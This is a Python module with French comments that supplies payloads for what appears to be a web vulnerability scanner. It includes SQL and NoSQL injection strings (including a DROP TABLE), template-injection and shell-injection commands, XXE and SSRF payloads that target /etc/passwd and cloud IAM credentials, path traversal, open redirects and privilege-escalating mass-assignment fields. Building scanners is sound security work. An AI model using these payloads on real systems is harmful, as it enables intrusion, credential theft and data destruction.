"""Bibliothèque de payloads par catégorie avec mutations et IDs traçables.

Principes :
- Budget limité : 2–3 payloads max par paramètre (signal/bruit > exhaustivité)
- Payload IDs uniques : permettent de tracer la réflexion dans la réponse
- Mutations : URL-encoding, double-encoding, Unicode pour bypasser les filtres naïfs
"""

from __future__ import annotations

import uuid
from dataclasses import dataclass
from enum import Enum
from urllib.parse import quote


class PayloadCategory(Enum):
    """Catégories de payloads pour les probes intrusifs."""

    SQL = "sql"
    NOSQL = "nosql"
    TEMPLATE = "template"
    XML = "xml"
    SHELL = "shell"
    PATH = "path"
    REDIRECT = "redirect"
    XSS_MARKER = "xss_marker"
    SSRF = "ssrf"
    MASS_ASSIGNMENT = "mass_assignment"


@dataclass(frozen=True)
class Payload:
    """Payload traçable avec identifiant et métadonnées d'encodage."""

    raw: str
    category: PayloadCategory
    payload_id: str
    encoding: str = "none"  # "none", "url", "double_url"
    description: str = ""


def _uid() -> str:
    return uuid.uuid4().hex[:8]


# ─── Bibliothèques de payloads ────────────────────────────────────────────────

_SQL_PAYLOADS: list[str] = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR "1"="1',
    "1; DROP TABLE users--",
    "1' AND SLEEP(1)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
    "1; WAITFOR DELAY '0:0:1'--",
    "' UNION SELECT NULL--",
    "\\",
    "/**/",
    "--",
]

_NOSQL_PAYLOADS: list[str] = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
    '{"$exists": true}',
]
# Variantes query string pour NoSQL
_NOSQL_QS_PAYLOADS: list[str] = [
    "[$ne]=1",
    "[$gt]=",
    "[$exists]=true",
    "[$regex]=.*",
]

_TEMPLATE_PAYLOADS: list[str] = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{% debug %}",
    "{{config}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
]

_XML_PAYLOADS: list[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><foo/>',
]

_SHELL_PAYLOADS: list[str] = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    ";ls -la",
    "&&id",
    "\nid\n",
    ";sleep 1",
    "|sleep 1",
    "$(sleep 1)",
]

_PATH_PAYLOADS: list[str] = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//etc/passwd",
    "..%2Fetc%2Fpasswd",
    "..%252Fetc%252Fpasswd",
    "%2e%2e%2fetc%2fpasswd",
    "..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

_REDIRECT_PAYLOADS: list[str] = [
    "https://evil.test",
    "//evil.test",
    "https://evil.test%2F@legitimate.test",
    "%68ttps://evil.test",
    "https://evil.test?foo=bar",
    "https://evil.test/",
]

_SSRF_PAYLOADS: list[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://127.0.0.1",
    "http://0.0.0.0",
    "http://[::1]",
    "http://localhost",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_",
    "dict://127.0.0.1:6379/INFO",
]

_MASS_ASSIGNMENT_FIELDS: list[tuple[str, str | int | bool]] = [
    ("role", "admin"),
    ("is_admin", True),
    ("admin", True),
    ("privilege", "superuser"),
    ("permissions", ["admin", "write", "delete"]),
    ("price", 0),
    ("discount", 100),
    ("balance", 999999),
    ("verified", True),
    ("active", True),
]

# ─── Fonctions publiques ──────────────────────────────────────────────────────


def get_payloads(category: PayloadCategory, budget: int = 3) -> list[Payload]:
    """Retourne une liste de payloads pour la catégorie, limitée au budget."""
    raw_list: list[str] = {
        PayloadCategory.SQL: _SQL_PAYLOADS,
        PayloadCategory.NOSQL: _NOSQL_PAYLOADS,
        PayloadCategory.TEMPLATE: _TEMPLATE_PAYLOADS,
        PayloadCategory.XML: _XML_PAYLOADS,
        PayloadCategory.SHELL: _SHELL_PAYLOADS,
        PayloadCategory.PATH: _PATH_PAYLOADS,
        PayloadCategory.REDIRECT: _REDIRECT_PAYLOADS,
        PayloadCategory.SSRF: _SSRF_PAYLOADS,
    }.get(category, [])

    return [Payload(raw=raw, category=category, payload_id=_uid()) for raw in raw_list[:budget]]


def get_nosql_qs_payloads(budget: int = 3) -> list[Payload]:
    """Payloads NoSQL spécifiques pour query string ([$ne]=1 etc.)."""
    return [Payload(raw=raw, category=PayloadCategory.NOSQL, payload_id=_uid(), description="nosql_qs") for raw in _NOSQL_QS_PAYLOADS[:budget]]


def get_mass_assignment_fields() -> list[tuple[str, str | int | bool | list]]:
    """Retourne les champs sensibles à injecter pour le mass assignment."""
    return list(_MASS_ASSIGNMENT_FIELDS)


def make_xss_marker(prefix: str = "sec0p5") -> Payload:
    """Génère un marqueur XSS unique et traçable dans la réponse."""
    uid = _uid()
    marker = f"{prefix}-{uid}"
    return Payload(
        raw=marker,
        category=PayloadCategory.XSS_MARKER,
        payload_id=uid,
        description="xss_reflection_marker",
    )


def mutate(payload_raw: str) -> list[str]:
    """Génère des variantes encodées d'un payload brut."""
    return [
        payload_raw,
        quote(payload_raw, safe=""),
        quote(quote(payload_raw, safe=""), safe=""),
    ]


def make_ssti_payloads() -> list[Payload]:
    """Payloads SSTI avec la valeur attendue 49 (7*7) dans la réponse."""
    return [Payload(raw=raw, category=PayloadCategory.TEMPLATE, payload_id=_uid(), description="ssti_eval") for raw in _TEMPLATE_PAYLOADS[:5]]
